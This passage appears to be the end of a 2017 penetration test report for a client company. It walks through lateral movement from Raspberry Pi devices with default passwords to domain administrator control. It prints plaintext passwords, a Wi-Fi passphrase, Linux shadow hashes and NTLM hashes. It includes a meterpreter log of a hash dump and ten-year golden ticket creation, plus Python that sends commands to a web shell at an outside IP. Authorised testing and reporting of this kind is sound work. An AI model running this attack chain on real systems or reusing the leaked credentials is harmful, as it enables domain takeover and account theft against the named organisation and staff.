<p>The tester restored the browser window so as not to arouse suspicions and continued to explore the first device via the reverse shell. Upon repeating the process for another server they noticed it had the same same password for the “pi” account, but it was a different server. /etc/issue identified the OS as “Raspbian GNU/Linux 8 ”, which has a default password of pi/raspberry. Testing the credentials against SSH worked for the servers 10.3.11.11, 10.3.11.12, 10.3.11.13, 10.3.11.14, 10.3.11.16, 10.3.11.17, and 10.3.11.18.</p>
<p>The tester started to pillage data on each server:</p>
<ul>
<li>10.3.11.11:
<ul>
<li>Passwords in startup scripts:
<ul>
<li>shaun@b2bwholesale.com.au/Hjb0f97rXEYN</li>
<li>graham@btbaustralia.com.au/j655dx266</li>
</ul></li>
<li>Interesting URLs from browser history:
<ul>
<li>http://192.168.0.101:8088/IRIS/stats.html</li>
<li>http://192.168.0.101:8088/IRIS/cs-stats.html</li>
</ul></li>
<li>Cookies from browser:
<ul>
<li>Salesforce</li>
<li>Linkedin</li>
</ul></li>
<li>VNC passwords:
<ul>
<li>Decrypted Bin Pass= ‘j655dx2’</li>
<li>Decrypted Hex Pass= ‘6a36353564783200’</li>
</ul></li>
</ul></li>
<li>10.3.11.12:
<ul>
<li>Passwords:
<ul>
<li>graham@btbaustralia.com.au/it18P8ln</li>
<li>graham@btbaustralia.com.au/j655dx266</li>
<li>shaun@b2bwholesale.com.au/Hjb0f97rXEYN</li>
</ul></li>
<li>Interesting URLs from browser history:
<ul>
<li>https://login.salesforce.com/?un=graham@btbaustralia.com.au&amp;pw=it18P8ln|‪Error - https://login.salesforce.com/?un=graham@btbaustralia.com.au&amp;pw=it18P8ln|1495691859|736474</li>
</ul></li>
<li>Cookies from browser:
<ul>
<li>Salesforce</li>
<li>Linkedin</li>
</ul></li>
<li>VNC passwords:
<ul>
<li>Decrypted Bin Pass= ‘j655dx2’</li>
<li>Decrypted Hex Pass= ‘6a36353564783200’</li>
</ul></li>
</ul></li>
<li>10.3.11.13:
<ul>
<li>No new information</li>
</ul></li>
<li>10.3.11.14:
<ul>
<li>No new passwords</li>
<li>No interesting browser history</li>
<li>Cookies from browser:
<ul>
<li>Salesforce</li>
<li>Linkedin</li>
<li>pubmatic.com</li>
<li>login.newrelic.com</li>
<li>twitter.com</li>
<li>newrelic.com</li>
</ul></li>
<li>VNC password are same as other boxes</li>
</ul></li>
<li>10.3.11.16:
<ul>
<li>No new passwords</li>
<li>No interesting browser history</li>
<li>Cookies from browser:
<ul>
<li>Salesforce</li>
<li>Linkedin</li>
</ul></li>
<li>VNC password are same as other boxes</li>
</ul></li>
<li>10.3.11.17:
<ul>
<li>No new passwords</li>
<li>Interesting URLs from browser history:
<ul>
<li>cacti.conit.com.au</li>
<li>http://192.168.0.101:8088/jenkins/?auto_refresh=true</li>
</ul></li>
<li>Cookies from browser:
<ul>
<li>Salesforce</li>
<li>Linkedin</li>
</ul></li>
<li>VNC password are same as other boxes</li>
</ul></li>
<li>10.3.11.18
<ul>
<li>No new passwords</li>
<li>No interesting browser history</li>
<li>Cookies from browser:
<ul>
<li>Salesforce</li>
<li>Linkedin</li>
</ul></li>
<li>VNC password are same as other boxes</li>
</ul></li>
</ul>
<h3 id="pivot-onto-developer-machine">Pivot onto developer machine</h3>
<p>The tester tried to reuse the credentials discovered against the developer box btb-dev (10.3.65.122). Access was granted via SSH using the credential pair graham/j655dx2 and elevation of privileges via sudo was successful. Pillaging from box the tester found a variety of useful information:</p>
<ul>
<li>The wireless password for the Melbourne office:</li>
</ul>
<pre><code>wpa_passphrase B2BOffice W238sjbz95Bw</code></pre>
<ul>
<li>Password hashes for a number of different user accounts:</li>
</ul>
<pre><code>git:$6$CKZwBvIO$ZtYTavPWmNNktkX5Yy7aLg765zN2snU5PypoRL4mFmcjVt/JlKsEiBA4XzOnWMmNbVE7cpc8b4oLqnZQ1rnRk/:17455:0:99999:7:::
radjiv:$6$ur4uzvtb$aHi1bYAMUQ0FJv9ofH3tyFuGW09QiAdTGbJu1Xqo8u0uUCEY7l6jcoe3BUCXqjus4WqePlmIZJSUEDAvpmNap.:17455:0:99999:7:::
sephen:$6$jYwiZmxY$yNJZ9e/VfJkJD50TZPhLXtzg0hiTVcQiYDVUTYxhYyRD9AGreSroQ4WxzN5WnS1p8z4rH5kGwdMMOK3N8UOGi.:17455:0:99999:7:::</code></pre>
<ul>
<li>Cleartext credentials for office 365:</li>
</ul>
<p>cat /etc/gitlab/gitlab.rb … gitlab_rails[‘smtp_enable’] = true gitlab_rails[‘smtp_address’] = “smtp.office365.com” gitlab_rails[‘smtp_port’] = 25 gitlab_rails[‘smtp_user_name’] = “graham@btbaustralia.com.au” gitlab_rails[‘smtp_password’] = “it18P8ln” gitlab_rails[‘smtp_domain’] = “btbaustralia.com.au” gitlab_rails[‘smtp_authentication’] = “login” gitlab_rails[‘smtp_enable_starttls_auto’] = true gitlab_rails[‘smtp_tls’] = false …</p>
<ul>
<li>Using the looted credentials the tester was able to logon to office 365 as Graham Corrigan.</li>
</ul>
<figure>
<img src="images/office365.png" title="Logging into office 365" alt="office_365.png" /><figcaption>office_365.png</figcaption>
</figure>
<h3 id="pivot-onto-nas-server-and-achieve-domain-administrator-privileges">Pivot onto NAS server and achieve domain administrator privileges</h3>
<p>Continuing to look around the environment, the tester was able to determine the naming scheme for the btb domain was “{firstname}{lastinitial}” by accessing the NAS server via RDP, where Graham’s account was listed on the login screen. Attempting to log in to the server with grahamc/j655dx2 was successful.</p>
<figure>
<img src="images/naming_scheme.png" title="Naming scheme identified" alt="naming_scheme.png" /><figcaption>naming_scheme.png</figcaption>
</figure>
<p>The tester noted that they had administrative privileges on the NAS server. Checking the sever groups and memberships, the only users with administrative prilileges were the local administrator account and domain administrators. The tester logged onto the domain controller with the stolen credentials and confirmed they were a member of the domain administrators group.</p>
<figure>
<img src="images/domain_admin.png" title="Graham Corrigan is member of Domain Admins" alt="domain_admin.png" /><figcaption>domain_admin.png</figcaption>
</figure>
<h3 id="achieve-domain-dominance">Achieve domain dominance</h3>
<p>Using meterpreter, the tester dumped the password hashes for the domain and created a golden ticket with a lifetime of 10 years so they could maintain dominance of the domain for the forseeable future.</p>
<pre><code>msf exploit(handler) &gt; sessions

Active sessions
===============

  Id  Type                   Information                      Connection
  --  ----                   -----------                      ----------
  1   meterpreter x86/win32  B2B\grahamc @ NAS                10.3.72.248:4444 -&gt; 10.3.11.5:56358 (10.3.11.5)
  2   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ B2B-DC-M1  10.3.72.248:4444 -&gt; 10.3.1.21:51974 (10.3.1.21)

msf exploit(handler) &gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &gt; shell
Process 3748 created.
Channel 7 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\grahamc&gt;whoami /user
whoami /user

USER INFORMATION
----------------

User Name   SID                                           
=========== ==============================================
b2b\grahamc S-1-5-21-1381631214-1986580073-1137387850-1173

C:\Users\grahamc&gt;exit
exit
meterpreter &gt; background 
[*] Backgrounding session 1...
msf exploit(handler) &gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &gt; run post/windows/gather/smart_hashdump 

[*] Running module against B2B-DC-M1
[*] Hashes will be saved to the database if one is connected.
[*] Hashes will be saved in loot in JtR password file format to:
[*] /Users/gee/.msf4/loot/20171106170906_default_10.3.1.21_windows.hashes_208765.txt
[+]     This host is a Domain Controller!
[*] Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:64fcc6af15ea6a56542e4a27928a729d
[+]     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:24fb62b8c40db1187cdf00531733be7b
[+]     SachinP:1106:aad3b435b51404eeaad3b435b51404ee:3a35b696f3fde69c9c59848fa95d7f1b
[+]     BrendonB:1107:aad3b435b51404eeaad3b435b51404ee:3b9dd24c020f9e37508c2d3ce8b4fe91
[+]     CINDY:1108:aad3b435b51404eeaad3b435b51404ee:808b904500c319bebb1d1ff636e12702

... snip ...

meterpreter &gt; use kiwi
Loading extension kiwi...

  .#####.   mimikatz 2.0 alpha (x86/win32) release &quot;Kiwi en C&quot;
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  &#39;#####&#39;    Ported to Metasploit by OJ Reeves `TheColonial` * * */


[!] Loaded x86 Kiwi on an x64 architecture.
success.

meterpreter &gt; golden_ticket_create -u administrator -d btb -k 64fcc6af15ea6a56542e4a27928a729d -s S-1-5-21-1381631214-1986580073-1137387850 -t btb_golden_ticket.tk
[+] Golden Kerberos ticket written to btb_golden_ticket.tk</code></pre>
<h1 id="appendix---modifications-to-hentix">Appendix - Modifications to hentix</h1>
<p>The modified command_wrapper function in hentix.py is below:</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb30-1" data-line-number="1"><span class="kw">def</span> command_wrapper(cmd):</a>
<a class="sourceLine" id="cb30-2" data-line-number="2">    <span class="co">#</span></a>
<a class="sourceLine" id="cb30-3" data-line-number="3">    <span class="co">#   Exampe command injection against cmd.php on localhost.</span></a>
<a class="sourceLine" id="cb30-4" data-line-number="4">    <span class="co">#   cmd is passed through cmd URL pamameter</span></a>
<a class="sourceLine" id="cb30-5" data-line-number="5">    <span class="co">#</span></a>
<a class="sourceLine" id="cb30-6" data-line-number="6">    p <span class="op">=</span> {<span class="st">&#39;cmd&#39;</span>: cmd}</a>
<a class="sourceLine" id="cb30-7" data-line-number="7">    url <span class="op">=</span> <span class="st">&quot;https://13.54.255.86/evil_shell4.jsp&quot;</span></a>
<a class="sourceLine" id="cb30-8" data-line-number="8">    requests.packages.urllib3.disable_warnings()</a>
<a class="sourceLine" id="cb30-9" data-line-number="9">    r <span class="op">=</span> requests.get(url, params<span class="op">=</span>p, verify<span class="op">=</span><span class="va">False</span>)</a>
<a class="sourceLine" id="cb30-10" data-line-number="10">    start <span class="op">=</span> r.text.find(<span class="st">&quot;&lt;pre&gt;&quot;</span>) <span class="op">+</span> <span class="dv">5</span></a>
<a class="sourceLine" id="cb30-11" data-line-number="11">    end <span class="op">=</span> r.text.find(<span class="st">&quot;&lt;/pre&gt;&quot;</span>)</a>
<a class="sourceLine" id="cb30-12" data-line-number="12">    <span class="cf">return</span> r.text[start:end]</a></code></pre></div>
<h1 id="document-management">Document Management</h1>
<h2 id="filename">Filename</h2>
<p>btb_2017_test_report_v1.1.pdf</p>
<h2 id="change-history">Change History</h2>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 39%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Version</th>
<th style="text-align: left;">Date</th>
<th style="text-align: left;">Author</th>
<th style="text-align: left;">Change Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">0.1</td>
<td style="text-align: left;">10 November 2017</td>
<td style="text-align: left;">George Stewart</td>
<td style="text-align: left;">Draft complete</td>
</tr>
<tr class="even">
<td style="text-align: left;">0.2</td>
<td style="text-align: left;">12 November 2017</td>
<td style="text-align: left;">Clem Colman</td>
<td style="text-align: left;">Internal QA</td>
</tr>
<tr class="odd">
<td style="text-align: left;">1.0</td>
<td style="text-align: left;">13 November 2017</td>
<td style="text-align: left;">George Stewart</td>
<td style="text-align: left;">Initial release to client</td>
</tr>
<tr class="even">
<td style="text-align: left;">1.1</td>
<td style="text-align: left;">27 November 2017</td>
<td style="text-align: left;">George Stewart</td>
<td style="text-align: left;">Update with feedback from client and retest results</td>
</tr>
</tbody>
</table>
<h2 id="referenced-documents">Referenced Documents</h2>
<table>
<colgroup>
<col style="width: 37%" />
<col style="width: 41%" />
<col style="width: 21%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Title</th>
<th style="text-align: left;">Filename</th>
<th style="text-align: left;">Version</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Network Overview</td>
<td style="text-align: left;">Network Overview.pdf</td>
<td style="text-align: left;">17/10/2017</td>
</tr>
<tr class="even">
<td style="text-align: left;">Marketing Material</td>
<td style="text-align: left;">Origin_Final_v2_email.pdf</td>
<td style="text-align: left;">2</td>
</tr>
<tr class="odd">
<td style="text-align: left;">CINDY and Network Infrastructure Penetration Test Plan</td>
<td style="text-align: left;">btb_2017_test_plan_v1.1.pdf</td>
<td style="text-align: left;">1.1</td>
</tr>
</tbody>
</table>
<hr />
<div style="font-size:9px;position=fixed;bottom=0;">
<p>© 2017, Colman Communciations.</p>
<p>Portions of this document and the templates used in its production are the property of Colman Communciations and may not be copied without permission.</p>
<h3 id="disclaimer">Disclaimer</h3>
<p>Colman Communciations notes that penetration tests are limited in a number of aspects:</p>
<ul>
<li>They are conducted with limited resources over a limited period of time. An attacker may not face the same constraints.</li>
<li>They are a point in time assessment. Changes to the security landscape including the discovery of new vulnerabilities, attack techniques, and changes in BTB’s environment may lead to new vulnerabilities over time.</li>
<li>They are performed in a specific environment. There may be differences in configuration between the environment assessed and others.</li>
</ul>
<p>As a result, Colman Communciations gives no guarantee, warranty, or assurance that the services it has performed and provided pursuant to the assessment will have the effect of:</p>
<ul>
<li>Identifying an exhaustive list of all threats and risks to the BTB’s systems;</li>
<li>Documenting all possible controls that might be applied to remediate identified threats and risks; and or</li>
<li>Being continually accurate and relevant as threats and risks as identified by the Vendor (and any recommended controls) may be time specific.</li>
</ul>
<p>Threats and risks to assessed systems and controls that have been implemented to remediate such risks and threats should be reviewed regularly to ensure their currency and efficacy.</p>
</div>
    </div>
</body>
</html>
